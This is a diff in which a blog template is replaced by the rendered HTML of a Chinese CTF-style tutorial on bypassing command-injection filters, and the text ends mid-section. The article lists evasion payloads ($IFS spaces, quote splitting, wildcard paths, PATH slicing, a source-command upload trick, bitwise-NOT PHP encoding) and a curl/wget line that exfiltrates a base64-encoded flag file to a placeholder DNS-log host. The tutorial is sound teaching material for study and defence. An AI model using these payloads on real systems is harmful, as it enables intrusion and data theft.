@@ -1,71 +1,999 @@
-extends widget/base
-block append head
-  link(rel='stylesheet', href= url_for('/style/post.css'))
-  link(rel='stylesheet', href= url_for('/style/themes/highlight-theme-light.css'))
-  link(rel='stylesheet', href= url_for('/style/common/jquery.fancybox.min.css'))
-  script(src= url_for("/js/highlight.pack.js"))
-  meta(name="description", content=truncate( strip_html(page.content), {length: 360, omission: '..'} ))
-  if theme.comment_valine && theme.comment_valine.enable
-      script(src="//unpkg.com/valine/dist/Valine.min.js")
-block topic
-    div#postTopic.is-full-height
-        - var title = truncate( page.title, {length: 65, omission: '..'} ) || ''
-        p.is-full-height.is-flex-shrink-0.is-flex.is-align-items-center.is-justify-content-center= title
-        p.is-full-height.is-flex-shrink-0.is-flex.is-align-items-center.is-justify-content-center= __('click_back_to_the_top')
 
-block content
-    - var tocContent = toc(page.content, {list_number: false})
-    main.container.is-max-widescreen.content.section.post-page.pt-4.px-4
-        .columns.is-flex-desktop.is-justify-content-center.is-flex-direction-row-reverse
-            .column.is-3.is-hidden-mobile(class= tocContent.length < 1 && 'is-hidden')!= tocContent
-            .column.is-9
-                header.my-4
-                    if page.tags && page.tags.length > 0
-                        each tag in page.tags.toArray()
-                            a(href= url_for(`/tags/${tag.name}`))
-                                i.tag.post-item-tag= tag.name
-                h1.mt-0.mb-1.is-family-serif#postTitle= page.title
-                if page.date
-                    time.has-text-grey(datetime=page.date.toJSON())= date(page.date, date_format)
-                article.mt-2.post-content!= page.content
-                section.jump-container.is-flex.is-justify-content-space-between.my-6
-                    // em is empty placeholder
-                    if page.prev
-                        - var preContent= `${ __('prev') }: ${ page.prev.title }`
-                        a.button.is-default(href= url_for(page.prev.path) title= page.prev.title)
-                            i.iconfont.icon-prev.mr-2.has-text-grey
-                            span.has-text-weight-semibold= preContent
-                    else
-                        em
-                    if page.next
-                        - var nextContent= `${ __('next') }: ${ page.next.title }`
-                        a.button.is-default(href= url_for(page.next.path) title= page.next.title)
-                            span.has-text-weight-semibold= nextContent
-                            i.iconfont.icon-next.ml-2.has-text-grey
-                if theme.comment_utteranc && theme.comment_utteranc.enable
-                    article.mt-6.comment-container
-                        script(
-                            async
-                            repo= theme.comment_utteranc.repo
-                            src= "https://utteranc.es/client.js"
-                            label= theme.comment_utteranc.label
-                            issue-term= theme.comment_utteranc.issue_term || "pathname"
-                            theme= theme.comment_utteranc.theme || "preferred-color-scheme"
-                        )
-                if theme.comment_valine && theme.comment_valine.enable
-                    article.mt-6.comment-container#vcomments(
-                        data-comment_valine_id= theme.comment_valine.appId
-                        data-comment_valine_key= theme.comment_valine.appKey
-                    )
-                if theme.comment_disqus && theme.comment_disqus.enable
-                    div#disqus_thread
-                    article.mt-6.comment-container#disqus
-                        script="var disqus_config = function () {this.page.url = '"+theme.comment_disqus.url+url_for(page.path)+"';this.page.identifier = '"+theme.comment_disqus.name+"';};"
-                        script="(function() {var d = document, s = d.createElement('script');s.src = 'https://"+theme.comment_disqus.name+".disqus.com/embed.js';s.setAttribute('data-timestamp', +new Date());(d.head || d.body).appendChild(s);})();"
-                        script(id="dsq-count-scr", src="//blog-pubgj2togw.disqus.com/count.js", async)
-block script
-    if theme.image_zoom && theme.image_zoom.enable
-        script(src= url_for("/js/jquery-3.6.1.min.js"))
-        script(src= url_for("/js/jquery-fancybox.min.js"))
-        script(src= url_for("/js/img_zoom.js"))
-    script(src= url_for("/js/post.js"))
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G582PR7P29"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-G582PR7P29');
+</script>
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="kivvs">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、常见可代替命令：12345678910111213more:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看ls：查看目录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈RCE绕过姿势">
+<meta property="og:url" content="https://kivvs.github.io/2026/08/14/%E6%B5%85%E8%B0%88RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:site_name" content="kivvs">
+<meta property="og:description" content="一、常见可代替命令：12345678910111213more:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看ls：查看目录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kivvs.github.io/images/%E6%B5%85%E8%B0%88RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-1.png">
+<meta property="og:image" content="https://kivvs.github.io/images/%E6%B5%85%E8%B0%88RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-2.png">
+<meta property="og:image" content="https://kivvs.github.io/images/%E6%B5%85%E8%B0%88RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-3.png">
+<meta property="article:published_time" content="2026-08-14T14:46:57.000Z">
+<meta property="article:modified_time" content="2026-08-14T14:47:25.247Z">
+<meta property="article:author" content="kivvs">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://kivvs.github.io/images/%E6%B5%85%E8%B0%88RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-1.png">
+  
+  
+  
+  <title>浅谈RCE绕过姿势 - kivvs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"kivvs.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"gtag":"G-G582PR7P29"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>kivvs</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="浅谈RCE绕过姿势"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-08-14 22:46" pubdate>
+          2026年8月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">浅谈RCE绕过姿势</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一、常见可代替命令："><a href="#一、常见可代替命令：" class="headerlink" title="一、常见可代替命令："></a>一、常见可代替命令：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>ls：查看目录<br>dir：查看目录<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="二、空格绕过"><a href="#二、空格绕过" class="headerlink" title="二、空格绕过"></a>二、空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">&gt; &lt; &lt;&gt; 重定向符<br>%20(space)<br>%09(tab)<br>$IFS$9 <br>$&#123;IFS&#125;（最好用这个）<br>$IFS  <br>%0a  换行符<br>&#123;cat,flag.txt&#125; 在大括号中逗号可起分隔作用<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、简单符号绕过正则"><a href="#三、简单符号绕过正则" class="headerlink" title="三、简单符号绕过正则"></a>三、简单符号绕过正则</h2><h3 id="1、单双引号法"><a href="#1、单双引号法" class="headerlink" title="1、单双引号法"></a>1、单双引号法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ca&#x27;&#x27;t flag.txt<br>ca&quot;&quot;t flag.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://kivvs.github.io/images/%E6%B5%85%E8%B0%88RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-1.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">因为单双引号中并没有字符，相当于在其中没有添加任何字符，命令意思不变<br></code></pre></td></tr></table></figure>
+
+<h3 id="2、跨行符’’绕过"><a href="#2、跨行符’’绕过" class="headerlink" title="2、跨行符’’绕过"></a>2、跨行符’’绕过</h3><p>跨行符的意思为接着上一行的内容，转到下一行接着输入命令，上下行均是一条命令</p>
+<p><img src="https://kivvs.github.io/images/%E6%B5%85%E8%B0%88RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-2.png" srcset="/img/loading.gif" lazyload>  </p>
+<h2 id="四、通配符绕过正则"><a href="#四、通配符绕过正则" class="headerlink" title="四、通配符绕过正则"></a>四、通配符绕过正则</h2><p>通配符可以替代任何字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">shell通配符有：<br>    * ：表示通配字符0次及以上<br>    ? : 表示通配字符0或<br></code></pre></td></tr></table></figure>
+
+<h3 id="1、可以通配得到的命令"><a href="#1、可以通配得到的命令" class="headerlink" title="1、可以通配得到的命令"></a>1、可以通配得到的命令</h3><p>base64：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">/bin/base64 可以通配为：<br>/???/????64<br>作用为将文件以base64编码形式输出<br></code></pre></td></tr></table></figure>
+
+
+
+<p> bzip2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">/usr/bin/bzip2 可以通配为：<br> <br>/???/???/????2<br> <br>作用为将文件压缩成后缀为bz2的压缩文件<br>flag.php ==&gt;  flag.php.bz2<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="2、字符串通配"><a href="#2、字符串通配" class="headerlink" title="2、字符串通配"></a>2、字符串通配</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag.php ==&gt; flag.???<br>             flag*<br>             ……<br></code></pre></td></tr></table></figure>
+
+
+
+<p>当然可以用通配符去通配一些命令，但不能全名称通配</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">例如：<br>/bin/ca?<br>相当于cat命令<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="五、变量拼接绕过正则"><a href="#五、变量拼接绕过正则" class="headerlink" title="五、变量拼接绕过正则"></a>五、变量拼接绕过正则</h2><p>可以在shell语句里定义变量，将被过滤的字符串分成部分绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">以flag.php为例:<br>x=lag;cat f$x.php<br>相当于:<br>cat flag.php<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="六、内联执行"><a href="#六、内联执行" class="headerlink" title="六、内联执行"></a>六、内联执行</h2><p>内联执行就是在一条shell语句中内嵌子shell语句,用主shell语句处理子语句的结果</p>
+<p>可用于内联语句的符号you ${},&#96;&#96;（反引号）</p>
+<p>例如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo `ls`<br> <br>echo $&#123;ls&#125;<br> <br>相当于把ls的结果使用echo输出<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="七-、“-”截取环境变量拼接"><a href="#七-、“-”截取环境变量拼接" class="headerlink" title="七 、“${}”截取环境变量拼接"></a>七 、“${}”截取环境变量拼接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Elite__zhb/article/details/130207786?spm=1001.2014.3001.5501">https://blog.csdn.net/Elite__zhb&#x2F;article&#x2F;details&#x2F;130207786？spm&#x3D;1001.2014.3001.5501</a>（Linux 变量操作符“${}“）</p>
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125; flag.txt<br>在此环境中相当于 nl flag.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://kivvs.github.io/images/%E6%B5%85%E8%B0%88RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-3.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="八、-中括号匹配绕过"><a href="#八、-中括号匹配绕过" class="headerlink" title="八、[]中括号匹配绕过"></a>八、[]中括号匹配绕过</h2><p>例如[a-c] 代表匹配 a-b之间的字符,包括a,b字符本身</p>
+<p>匹配范围为当前目录</p>
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">/[a-c][h-j][m-o]/[b-d]a[s-u] flag.txt<br>相当于<br>/bin/cat flag.txt<br>因为[]匹配范围只在当前路径<br>所以要为bin绝对路径<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="九、source命令："><a href="#九、source命令：" class="headerlink" title="九、source命令："></a>九、source命令：</h2><p>source命令，又称点命令,可以用点号( . ),代替</p>
+<p>该命令可以读取并执行文件中的命令</p>
+<p>可构建文件上传表单，上传命令文件执行</p>
+<p>表单为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>    &lt;title&gt;POST数据包POC&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>&lt;!--链接是当前打开的题目链接--&gt;<br>    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;<br>    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;<br>    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>get请求为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">?c=.+/???/????????[@-[]<br> <br>一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）<br></code></pre></td></tr></table></figure>
+
+<p>注意：通过.去执行sh命令不需要有执行权限</p>
+<p>可以参考p神的这篇文章无字母数字webshell之提高篇 | 离别歌（<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a>）</p>
+<h2 id="十、无回显rce："><a href="#十、无回显rce：" class="headerlink" title="十、无回显rce："></a>十、无回显rce：</h2><p><a target="_blank" rel="noopener" href="https://qwen11.github.io/post/%E6%97%A0%E5%9B%9E%E6%98%BERCE/">https://qwen11.github.io/post/%E6%97%A0%E5%9B%9E%E6%98%BERCE/</a></p>
+<p>无回显的执行函数：</p>
+<p>exec()</p>
+<p>shell_exec()</p>
+<p>&#96;&#96; （反引号）</p>
+<p>这些需要php函数echo才可以输出结果  </p>
+<h3 id="1、复制到可访问文件"><a href="#1、复制到可访问文件" class="headerlink" title="1、复制到可访问文件"></a>1、复制到可访问文件</h3><p>tee命令：</p>
+<p>tee 命令可用于创建或追加写入文件</p>
+<p>可配合cat等打开文件命令和管道符将flag写入到规定文件中</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">先将根目录复制到某个文件，然后访问查看<br>ls /| tee ls.txt<br>然后输入 url/1.txt  即可查看根目录<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">再复制flag文件，然后访问查看<br>cat /flag.php | tee flag.txt<br>然后输入 url/falg.txt  即可查看根目录<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">还可以使用其他的复制方法<br>copy /flag.php flag.txt<br>mv /flag.php flag.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="2、dnslog外带数据法"><a href="#2、dnslog外带数据法" class="headerlink" title="2、dnslog外带数据法"></a>2、dnslog外带数据法</h3><p>需要dnslog平台，可自己搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl dnslog平台url/`cat flag.php|base64`<br>wget dnslog平台url/`cat flag.php|base64`<br></code></pre></td></tr></table></figure>
+
+<h3 id="3、反弹shell："><a href="#3、反弹shell：" class="headerlink" title="3、反弹shell："></a>3、反弹shell：</h3><p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/elite__zhb/article/details/130208829">https://blog.csdn.net/elite__zhb&#x2F;article&#x2F;details&#x2F;130208829</a></p>
+<h2 id="十一、无字母无数字RCE"><a href="#十一、无字母无数字RCE" class="headerlink" title="十一、无字母无数字RCE"></a>十一、无字母无数字RCE</h2><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;system(&quot;ls&quot;);&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;!--  (~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>%D7%DD%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>C%DD%D6%C4) --&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们给出一个目标payload</p>
